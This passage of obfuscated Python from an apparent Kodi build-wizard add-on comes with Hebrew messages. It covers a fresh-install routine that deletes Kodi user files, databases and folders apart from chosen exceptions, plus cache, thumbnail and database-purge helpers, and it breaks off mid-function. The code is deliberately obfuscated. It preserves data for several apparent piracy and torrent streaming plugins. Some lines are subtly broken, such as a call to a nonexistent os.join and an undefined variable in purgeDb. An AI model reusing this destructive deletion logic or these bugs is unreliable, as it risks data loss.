				elif OO00O00OOO00OOO00 =='MyVideos116.db'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4953
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4954
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'skin.anonymous.mod'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4955
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'skin.Premium.mod'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4956
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'skin.anonymous.nox'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4957
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'skin.phenomenal'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4958
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'plugin.video.metalliq'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4959
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'skin.titan'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4961
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'pvr.iptvsimple'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4962
				elif OO00O00OOO00OOO00 =='sources.xml'and O0000O00000OOO00O [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4964
				elif OO00O00OOO00OOO00 =='quicknav.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4967
				elif OO00O00OOO00OOO00 =='x1101.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4968
				elif OO00O00OOO00OOO00 =='b-srtym-b.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4969
				elif OO00O00OOO00OOO00 =='x1102.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4970
				elif OO00O00OOO00OOO00 =='b-sdrvt-b.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4971
				elif OO00O00OOO00OOO00 =='x1112.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4972
				elif OO00O00OOO00OOO00 =='b-tlvvyzyh-b.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4973
				elif OO00O00OOO00OOO00 =='x1111.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4974
				elif OO00O00OOO00OOO00 =='b-tvknyshrly-b.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4975
				elif OO00O00OOO00OOO00 =='x1110.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4976
				elif OO00O00OOO00OOO00 =='b-yldym-b.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4977
				elif OO00O00OOO00OOO00 =='x1114.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4978
				elif OO00O00OOO00OOO00 =='b-mvzyqh-b.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4979
				elif OO00O00OOO00OOO00 =='mainmenu.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4980
				elif OO00O00OOO00OOO00 =='skin.Premium.mod.properties'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4981
				elif OO00O00OOO00OOO00 =='x1122.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4983
				elif OO00O00OOO00OOO00 =='b-spvrt-b.DATA.xml'and O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4984
				elif OO00O00OOO00OOO00 =='favourites.xml'and O0000O00000OOO00O [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4989
				elif OO00O00OOO00OOO00 =='guisettings.xml'and O0000O00000OOO00O [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4991
				elif OO00O00OOO00OOO00 =='profiles.xml'and O0000O00000OOO00O [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4992
				elif OO00O00OOO00OOO00 =='advancedsettings.xml'and O0000O00000OOO00O [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4993
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4994
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'program.apollo'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4995
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4996
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'plugin.video.telemedia'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4997
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'plugin.video.elementum'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:5000
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:5002
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'weather.yahoo'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:5003
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'plugin.video.quasar'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:5004
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'program.apollo'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:5005
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:5006
				elif O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:5007
				elif OO00O00OOO00OOO00 in LOGFILES :wiz .log ("Keep Log File: %s"%OO00O00OOO00OOO00 ,xbmc .LOGNOTICE )#line:5008
				elif OO00O00OOO00OOO00 .endswith ('.db'):#line:5009
					try :#line:5010
						if OO00O00OOO00OOO00 ==OOOO0OO0O000000OO and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OO00O00OOO00OOO00 ,KODIV ),xbmc .LOGNOTICE )#line:5011
						else :os .remove (os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ))#line:5012
					except Exception as OO0OOOO0O0OO00O00 :#line:5013
						if not OO00O00OOO00OOO00 .startswith ('Textures13'):#line:5014
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5015
							wiz .log ("-> %s"%(str (OO0OOOO0O0OO00O00 )),xbmc .LOGNOTICE )#line:5016
							wiz .purgeDb (os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ))#line:5017
				else :#line:5018
					DP .update (int (wiz .percentage (O000OO00OO00OO00O ,OO0O0O0O0OO0O000O )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00O00OOO00OOO00 ),'')#line:5019
					try :os .remove (os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ))#line:5020
					except Exception as OO0OOOO0O0OO00O00 :#line:5021
						wiz .log ("Error removing %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:5022
						wiz .log ("-> / %s"%(str (OO0OOOO0O0OO00O00 )),xbmc .LOGNOTICE )#line:5023
			if DP .iscanceled ():#line:5024
				DP .close ()#line:5025
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5026
				return False #line:5027
		for O0OOO0O0OOOO000OO ,OO0O00OOOOOOO00OO ,O0OOO000OOO0OO000 in os .walk (O0OOO0OOOOOO0O0O0 ,topdown =True ):#line:5028
			OO0O00OOOOOOO00OO [:]=[O000000O000O0OOOO for O000000O000O0OOOO in OO0O00OOOOOOO00OO if O000000O000O0OOOO not in EXCLUDES ]#line:5029
			for OO00O00OOO00OOO00 in OO0O00OOOOOOO00OO :#line:5030
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00O00OOO00OOO00 ),'')#line:5031
			  if OO00O00OOO00OOO00 not in ["Database","userdata","temp","addons","addon_data"]:#line:5032
			   if not (OO00O00OOO00OOO00 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5033
			    if not (OO00O00OOO00OOO00 =='skin.titan'and KEEPSKIN3 =='true'):#line:5035
			      if not (OO00O00OOO00OOO00 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5036
			       if not (OO00O00OOO00OOO00 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5037
			        if not (OO00O00OOO00OOO00 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5038
			         if not (OO00O00OOO00OOO00 =='program.apollo'and KEEPINFO =='true'):#line:5039
			          if not (OO00O00OOO00OOO00 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5040
			           if not (OO00O00OOO00OOO00 =='weather.yahoo'and KEEPWEATHER =='true'):#line:5041
			            if not (OO00O00OOO00OOO00 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5042
			             if not (OO00O00OOO00OOO00 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5043
			              if not (OO00O00OOO00OOO00 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5044
			               if not (OO00O00OOO00OOO00 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5045
			                if not (OO00O00OOO00OOO00 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5046
			                 if not (OO00O00OOO00OOO00 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5047
			                  if not (OO00O00OOO00OOO00 =='plugin.video.neptune'and KEEPINFO =='true'):#line:5048
			                   if not (OO00O00OOO00OOO00 =='plugin.video.youtube'and KEEPINFO =='true'):#line:5049
			                    if not (OO00O00OOO00OOO00 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5050
			                     if not (OO00O00OOO00OOO00 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5051
			                      if not (OO00O00OOO00OOO00 =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5052
			                       if not (OO00O00OOO00OOO00 =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5053
			                           if not (OO00O00OOO00OOO00 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5057
			                            if not (OO00O00OOO00OOO00 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5058
			                             if not (OO00O00OOO00OOO00 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5059
			                              if not (OO00O00OOO00OOO00 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5060
			                               if not (OO00O00OOO00OOO00 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5061
			                                  shutil .rmtree (os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),ignore_errors =True ,onerror =None )#line:5063
			if DP .iscanceled ():#line:5064
				DP .close ()#line:5065
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5066
				return False #line:5067
		DP .close ()#line:5068
		wiz .clearS ('build')#line:5069
		if over ==True :#line:5070
			return True #line:5071
		elif install =='restore':#line:5072
			return True #line:5073
		elif install :#line:5074
			buildWizard (install ,'normal',over =True )#line:5075
		else :#line:5076
			if INSTALLMETHOD ==1 :O0000O0OOO0O0OO0O =1 #line:5077
			elif INSTALLMETHOD ==2 :O0000O0OOO0O0OO0O =0 #line:5078
			else :O0000O0OOO0O0OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5079
			if O0000O0OOO0O0OO0O ==1 :wiz .reloadFix ('fresh')#line:5080
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5081
	else :#line:5082
		if not install =='restore':#line:5083
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5084
			wiz .refresh ()#line:5085
def clearCache ():#line:5090
		wiz .clearCache ()#line:5091
def fixwizard ():#line:5095
		wiz .fixwizard ()#line:5096
def totalClean ():#line:5098
		wiz .clearCache ()#line:5100
		wiz .clearPackages ('total')#line:5101
		clearThumb ('total')#line:5102
		cleanfornewbuild ()#line:5103
def cleanfornewbuild ():#line:5104
		try :#line:5105
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5106
		except :#line:5107
			pass #line:5108
		try :#line:5109
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5110
		except :#line:5111
			pass #line:5112
		try :#line:5113
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5114
		except :#line:5115
			pass #line:5116
def clearThumb (type =None ):#line:5117
	O0O00O00OOO00OOO0 =wiz .latestDB ('Textures')#line:5118
	if not type ==None :O00O00OO000OOO00O =1 #line:5119
	else :O00O00OO000OOO00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O0O00O00OOO00OOO0 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5120
	if O00O00OO000OOO00O ==1 :#line:5121
		try :wiz .removeFile (os .join (DATABASE ,O0O00O00OOO00OOO0 ))#line:5122
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O0O00O00OOO00OOO0 )#line:5123
		wiz .removeFolder (THUMBS )#line:5124
	else :wiz .log ('Clear thumbnames cancelled')#line:5126
	wiz .redoThumbs ()#line:5127
def purgeDb ():#line:5129
	O00OO0O000OOOOO0O =[];OO00O0OO0O0O0000O =[]#line:5130
	for OO0O0O000O00O0000 ,OO0O00O000O0OO000 ,O0O0O0O0O0O0OO000 in os .walk (HOME ):#line:5131
		for OO0O0O0OO0000OOOO in fnmatch .filter (O0O0O0O0O0O0OO000 ,'*.db'):#line:5132
			if OO0O0O0OO0000OOOO !='Thumbs.db':#line:5133
				O00O00O000O0O00OO =os .path .join (OO0O0O000O00O0000 ,OO0O0O0OO0000OOOO )#line:5134
				O00OO0O000OOOOO0O .append (O00O00O000O0O00OO )#line:5135
				OOO0OO00OO0OO000O =O00O00O000O0O00OO .replace ('\\','/').split ('/')#line:5136
				OO00O0OO0O0O0000O .append ('(%s) %s'%(OOO0OO00OO0OO000O [len (OOO0OO00OO0OO000O )-2 ],OOO0OO00OO0OO000O [len (OOO0OO00OO0OO000O )-1 ]))#line:5137
	if KODIV >=16 :#line:5138
		OOO0OOO00OO0OOOOO =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO00O0OO0O0O0000O )#line:5139
		if OOO0OOO00OO0OOOOO ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5140
		elif len (OOO0OOO00OO0OOOOO )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5141
		else :#line:5142
			for OOO0OO0OO0O000000 in OOO0OOO00OO0OOOOO :wiz .purgeDb (O00OO0O000OOOOO0O [OOO0OO0OO0O000000 ])#line:5143
	else :#line:5144
		OOO0OOO00OO0OOOOO =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO00O0OO0O0O0000O )#line:5145
		if OOO0OOO00OO0OOOOO ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5146
		else :wiz .purgeDb (O00OO0O000OOOOO0O [OOO0OO0OO0O000000 ])#line:5147
def fastupdatefirstbuild (O0O0OOOO0O0OOOOOO ):#line:5153
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5155
	if ENABLE =='Yes':#line:5156
		if not NOTIFY =='true':#line:5157
			OO000O000O0O0000O =wiz .workingURL (NOTIFICATION )#line:5158
			if OO000O000O0O0000O ==True :#line:5159
				OO0O0OOO0O000OOO0 ,O0O000000000O0OOO =wiz .splitNotify (NOTIFICATION )#line:5160
				if not OO0O0OOO0O000OOO0 ==False :#line:5162
					try :#line:5163
